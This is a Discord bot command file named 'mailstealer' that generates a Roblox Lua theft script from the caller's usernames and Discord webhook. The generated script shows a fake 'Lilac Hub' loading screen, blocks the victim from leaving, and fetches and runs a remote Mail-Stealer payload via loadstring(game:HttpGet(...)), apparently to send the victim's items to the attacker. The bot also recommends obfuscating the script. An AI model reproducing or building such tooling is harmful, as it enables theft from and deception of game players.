const { SlashCommandBuilder } = require("discord.js");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("mailstealer")
    .setDescription("Generates Your Mail-Stealer Script!")
    .addStringOption((option) =>
      option
        .setName("main-username")
        .setDescription("Your main Roblox username")
        .setRequired(true)
    )
    .addStringOption((option) =>
      option
        .setName("alt-username")
        .setDescription("Your alt Roblox username (optional)")
    )
    .addStringOption((option) =>
      option
        .setName("webhook")
        .setDescription("Your Discord webhook")
        .setRequired(false)
    ),
  async execute(interaction) {
    const mainUsername = interaction.options.getString("main-username");
    const altUsername = interaction.options.getString("alt-username") || "N/A";
    const webhook = interaction.options.getString("webhook");

    const message =
      "```lua\n" +
      'UserName = "' +
      mainUsername +
      '"\n' +
      'UserName2 = "' +
      altUsername +
      "\" -- optional delete the whole line if you don't want it\n" +
      'Webhook = "' +
      webhook +
      "\" -- optional delete the whole line if you don't want it\n" +
      "_G.LoadingScreen = true\n" +
      "_G.AntiLeave = true\n" +
      "_G.MouseLock = true\n" +
      '_G.ScriptName = "Lilac Hub"\n' +
      '_G.FirstText = "Script Preparing"\n' +
      '_G.SecondText = "Script Loading..."\n' +
      '_G.ThirdText = "Almost Done..."\n' +
      "_G.WaitingTime = 180 -- it's the time between 0% and 100% in seconds\n" +
      'loadstring(game:HttpGet("https://raw.githubusercontent.com/AnyThingse/Scripts/main/Mail-Stealer.", true))()\n' +
      "```" +
      "\n";
    const obfuscateMessage =
      "You Can Obfuscate Your Using `https://luaobfuscator.com/`";

    await interaction.user.send(message + "\n" + obfuscateMessage);

    await interaction.reply("**Your script has been sent to you in DMs.**");
  },
};
